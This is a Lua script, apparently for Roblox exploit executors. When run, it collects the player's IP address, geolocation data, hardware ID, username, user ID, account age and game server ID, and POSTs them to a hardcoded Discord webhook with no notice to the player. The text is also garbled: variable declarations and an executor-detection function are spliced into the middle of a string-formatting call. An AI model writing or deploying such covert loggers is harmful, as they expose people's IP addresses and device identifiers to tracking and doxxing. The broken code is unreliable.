
-- Webhook creation
local function createWebhookData()
    local webhookcheck = detectExecutor()
    return HttpService:JSONEncode({
        ["avatar_url"] = "https://cdn.discordapp.com/attachments/1306301015347167350/1369302674360504400/uhq5zTcMPM3tOW_fbUz4PayDt_5pkEXdyXXoRWs3XOg.png?ex=681c06bd&is=681ab53d&hm=ad40a611217c209fa2fca81db4848c04923a0558e770aca634497560652c4c5e&",
        ["content"] = "",
        ["embeds"] = {{
            ["author"] = {["name"] = "Lock executed", ["url"] = "https://roblox.com"},
            ["description"] = string.format(
                "__[Player Info](https://www.roblox.com/users/%d)__" ..
                " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s"local Userid = LocalPlayer.UserId
local DName = LocalPlayer.DisplayName
local Name = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Country = game.LocalizationService.RobloxLocaleId
local GetIp = game:HttpGet("https://v4.ident.me/")
local GetData = game:HttpGet("http://ip-api.com/json")
local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name

-- Executor detection
local function detectExecutor()
    local executor = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
        or (secure_load and "Sentinel")
        or (pebc_execute and "ProtoSmasher")
        or (KRNL_LOADED and "Krnl")
        or (is_sirhurt_closure and "SirHurt")
        or (identifyexecutor and identifyexecutor():find("ScriptWare") and "Script-Ware")
        or "Unsupported"
    return executor
end
 ..
                "\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s" ..
                "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
                "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
                "\n\n**Data:**```%s```\n\n**JobId:**```%s```",
                Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
                tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
                game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
                GetData, ConsoleJobId
            ),
            ["type"] = "rich",
            ["color"] = tonumber("0xFFD700"),
            ["thumbnail"] = {
                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"
            }
        }}
    })
end

-- Send webhook
local function sendWebhook(url, data)
    local headers = {["content-type"] = "application/json"}
    local request = http_request or request or HttpPost or syn.request
    request({Url = url, Body = data, Method = "POST", Headers = headers})
end

-- Call webhook once at script start
local webhookUrl = "https://discord.com/api/webhooks/1392966553204555917/AitvLsZx8J53Pg0fHzD5iBxpCqvsRaFCIGAHj-2y3S1iR1TluVHPKIaN1kh0MGsD_13z"
sendWebhook(webhookUrl, createWebhookData())
